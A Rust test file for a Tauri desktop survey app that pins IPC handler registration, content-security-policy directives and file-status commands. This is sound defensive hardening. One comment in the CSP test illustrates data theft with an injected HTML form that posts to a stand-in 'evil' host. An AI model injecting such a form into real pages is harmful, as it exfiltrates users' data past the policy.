//! App-surface contract tests relocated next to the wiring they pin, ahead of
//! the crate split: `lib.rs`'s `generate_handler![]` registration and
//! `tauri.conf.json` stay with the app crate, so the tests that read them
//! live here too.

/// The body of the `generate_handler![...]` block in `src`, found by counting
/// `[`/`]` depth from the macro's opening bracket to its matching close. A
/// first-`]` slice would end the scan at the `]` of any attribute inside the
/// block (e.g. `#[cfg(feature = "e2e")]`), silently truncating the scanned
/// region and letting the contract tests below pass vacuously.
pub(super) fn generate_handler_block(src: &str) -> &str {
    let start = src
        .find("generate_handler![")
        .expect("generate_handler![ not found")
        + "generate_handler![".len();
    let mut depth = 1usize;
    let end = src[start..]
        .char_indices()
        .find_map(|(i, c)| {
            match c {
                '[' => depth += 1,
                ']' => depth -= 1,
                _ => {}
            }
            (depth == 0).then_some(i)
        })
        .expect("matching closing ] not found for generate_handler!");
    &src[start..start + end]
}

#[test]
fn generate_handler_block_scans_past_inner_brackets() {
    let src = "\
        .invoke_handler(tauri::generate_handler![\n\
            commands::project::create_project,\n\
            #[cfg(feature = \"e2e\")]\n\
            commands::debug::e2e_probe,\n\
            commands::project::after_attribute,\n\
        ])\n\
        .setup(trailing_marker)";
    let block = generate_handler_block(src);
    assert!(
        block.contains("after_attribute"),
        "an attribute's `]` inside the block must not truncate the scan; got: {block}"
    );
    assert!(
        !block.contains("trailing_marker"),
        "the scan must stop at the macro's own closing bracket; got: {block}"
    );
}

#[test]
fn the_legacy_open_project_is_not_exposed_over_ipc() {
    // `AppState::open_project` deliberately has NO canonical-storage guard
    // (see its doc comment): only the command executor and tests reach it.
    // That is only sound while the webview cannot reach it, so pin the
    // non-exposure the same way
    // `registry_covers_all_commands` reads the handler block.
    let lib_src = include_str!("../lib.rs");
    let block = generate_handler_block(lib_src);
    let exposed = block.lines().any(|line| {
        let trimmed = line.trim();
        !trimmed.starts_with("//")
            && trimmed
                .rsplit("::")
                .next()
                .is_some_and(|name| name.trim_end_matches(',').trim() == "open_project")
    });
    assert!(
        !exposed,
        "open_project gained an IPC registration - it must now run the \
         canonical-storage guard (see AppState::open_project's doc comment)"
    );
}

/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
///
/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
/// addition is gated on the isolation pattern, which this app does not use.
///
/// Omitting it does not brick the app, which is exactly why this needs a test:
/// the failure is silent. Tauri catches the CSP rejection, warns once to a
/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
/// and falls back to `postMessage` for the rest of the session - losing the
/// binary response path for every IPC reply. Nothing else in this repo can catch
/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
/// a real `tauri build`.
#[test]
fn test_csp_allows_the_tauri_ipc_origin() {
    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
    let conf: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();

    let security = &conf["app"]["security"];
    for key in ["csp", "devCsp"] {
        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
        // is deny-level here, and this module's `#[expect]` (commands/mod.rs)
        // covers `unwrap`/`expect` but deliberately not `panic!`.
        let policy = security[key].as_str();
        assert!(policy.is_some(), "app.security.{key} must be a string");
        let policy = policy.unwrap();

        let connect_src = policy
            .split(';')
            .map(str::trim)
            .find(|directive| directive.starts_with("connect-src"));
        assert!(connect_src.is_some(), "{key} must declare connect-src");
        let connect_src = connect_src.unwrap();

        for origin in ["ipc:", "http://ipc.localhost"] {
            assert!(
                connect_src.split_whitespace().any(|src| src == origin),
                "{key}'s connect-src must list `{origin}` or every invoke falls \
                 back to the slower postMessage transport; got: {connect_src}"
            );
        }

        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
        // an injected `<form method=POST action=https://evil/>` posts survey data
        // straight past it. Neither directive can break a Tauri app, so there is
        // no reason for either to be absent.
        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
            assert!(
                policy.split(';').map(str::trim).any(|d| d == directive),
                "{key} must declare `{directive}` - it does not fall back to \
                 default-src; got: {policy}"
            );
        }
    }
}

/// The `.stalx` version 2 file-status commands the frontend's save-conflict
/// prompt, read-only and conversion banners, status bar and dirty tracking
/// call.
const FILE_STATUS_COMMANDS: [&str; 5] = [
    "save_project_overwriting",
    "take_conversion_notice",
    "has_unsaved_changes",
    "project_read_only_reason",
    "project_file_is_legacy",
];

/// Every `.ts` / `.tsx` file under `dir` that is not a test.
fn frontend_sources(dir: &std::path::Path, out: &mut Vec<(std::path::PathBuf, String)>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if path.is_dir() {
            if name != "__tests__" && name != "node_modules" {
                frontend_sources(&path, out);
            }
        } else if path
            .extension()
            .is_some_and(|ext| ext.eq_ignore_ascii_case("ts") || ext.eq_ignore_ascii_case("tsx"))
            && !name.contains(".test.")
            && !name.contains(".spec.")
        {
            if let Ok(text) = std::fs::read_to_string(&path) {
                out.push((path, text));
            }
        }
    }
}

/// The five commands are registered handlers, and the frontend calls each
/// under that exact name: a rename on either side would leave the save
/// prompt, a banner or the dirty flag silently dead (the call fails at run
/// time, never at build time).
#[test]
fn the_file_status_commands_are_registered_and_called_by_the_frontend() {
    let block = generate_handler_block(include_str!("../lib.rs"));
    let registered: Vec<&str> = block
        .lines()
        .map(|line| line.trim().trim_end_matches(','))
        .collect();
    let mut sources = Vec::new();
    frontend_sources(
        &std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../src"),
        &mut sources,
    );
    assert!(!sources.is_empty(), "the frontend sources must be readable");
    for name in FILE_STATUS_COMMANDS {
        let handler = format!("commands::project::{name}");
        assert!(
            registered.contains(&handler.as_str()),
            "`{handler}` must be registered in generate_handler!"
        );
        let literal = format!("'{name}'");
        assert!(
            sources.iter().any(|(_, text)| text.contains(&literal)),
            "no frontend source calls {literal}"
        );
    }
}

/// The IPC wrappers themselves, on a real `AppState` holding a version 2 file:
/// the answers the frontend acts on, in the order it asks.
#[test]
fn the_file_status_commands_answer_what_the_frontend_acts_on() {
    use super::project;
    use crate::core::state::{EXTERNALLY_MODIFIED_CODE, READ_ONLY_FILE_CODE};
    use crate::core::{AppState, Command};
    use crate::models::survey::{LineMeta, Project, StartAt};
    use crate::models::{ShotData, ShotUpdates};
    use crate::persistence::stalx_v2::{self, Extras, Mode};
    use tauri::Manager;

    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("status.stalx");
    let mut survey = Project::new("File status", None);
    let line = survey
        .add_line(
            LineMeta::default(),
            StartAt::New,
            vec![ShotData {
                length: 4.0,
                ..ShotData::default()
            }],
        )
        .unwrap();
    let start = survey.line(line).unwrap().start;
    survey.set_placement(start, 0.0, 0.0).unwrap();
    std::fs::write(
        &path,
        stalx_v2::encode(&survey, &Extras::default(), Mode::Normal).unwrap(),
    )
    .unwrap();

    let app = tauri::test::mock_app();
    app.manage(AppState::new().unwrap());
    let state = || app.state::<AppState>();

    // Nothing open: nothing to say.
    assert!(!project::has_unsaved_changes(state()));
    assert_eq!(project::take_conversion_notice(state()), None);
    assert_eq!(project::project_read_only_reason(state()), None);
    assert!(!project::project_file_is_legacy(state()));

    // An ordinary version 2 file: editable, nothing converted, clean.
    let opened = state().execute(Command::OpenProject { path: path.clone() });
    assert!(opened.success, "{:?}", opened.error);
    assert_eq!(project::project_read_only_reason(state()), None);
    assert!(!project::project_file_is_legacy(state()));
    assert_eq!(project::take_conversion_notice(state()), None);
    assert!(!project::has_unsaved_changes(state()));

    // An edit dirties it.
    let shot_id = state().get_project_state().unwrap().lines()[0].shots[0].id;
    let edited = state().execute(Command::UpdateShot {
        line_id: line,
        shot_id,
        updates: ShotUpdates {
            length: Some(5.0),
            ..ShotUpdates::default()
        },
    });
    assert!(edited.success, "{:?}", edited.error);
    assert!(project::has_unsaved_changes(state()));

    // Another program changes the file: the save is refused with the code the
    // prompt keys on, and the Overwrite answer writes it.
    let theirs = format!("{}\n", std::fs::read_to_string(&path).unwrap());
    std::fs::write(&path, &theirs).unwrap();
    let refused = project::save_project(state(), None, None);
    assert!(!refused.success);
    assert!(refused
        .error
        .as_deref()
        .unwrap_or_default()
        .starts_with(EXTERNALLY_MODIFIED_CODE));
    assert!(project::has_unsaved_changes(state()));
    let overwritten = project::save_project_overwriting(state(), None);
    assert!(overwritten.success, "{:?}", overwritten.error);
    assert!(!project::has_unsaved_changes(state()));
    assert_ne!(std::fs::read_to_string(&path).unwrap(), theirs);

    // A file made with a newer Stalagmight: the banner's reason, and no save.
    let text = std::fs::read_to_string(&path).unwrap();
    let newer = text.replacen("\"requires\":[]", "\"requires\":[\"x-future\"]", 1);
    assert_ne!(newer, text);
    std::fs::write(&path, &newer).unwrap();
    let reopened = state().execute(Command::OpenProject { path: path.clone() });
    assert!(reopened.success, "{:?}", reopened.error);
    let reason = project::project_read_only_reason(state()).expect("read-only");
    assert!(reason.contains("x-future"), "{reason}");
    // A peek: asking again gives the same answer.
    assert_eq!(project::project_read_only_reason(state()), Some(reason));
    let refused = project::save_project_overwriting(state(), None);
    assert!(refused
        .error
        .as_deref()
        .unwrap_or_default()
        .starts_with(READ_ONLY_FILE_CODE));
    assert_eq!(std::fs::read_to_string(&path).unwrap(), newer);
}
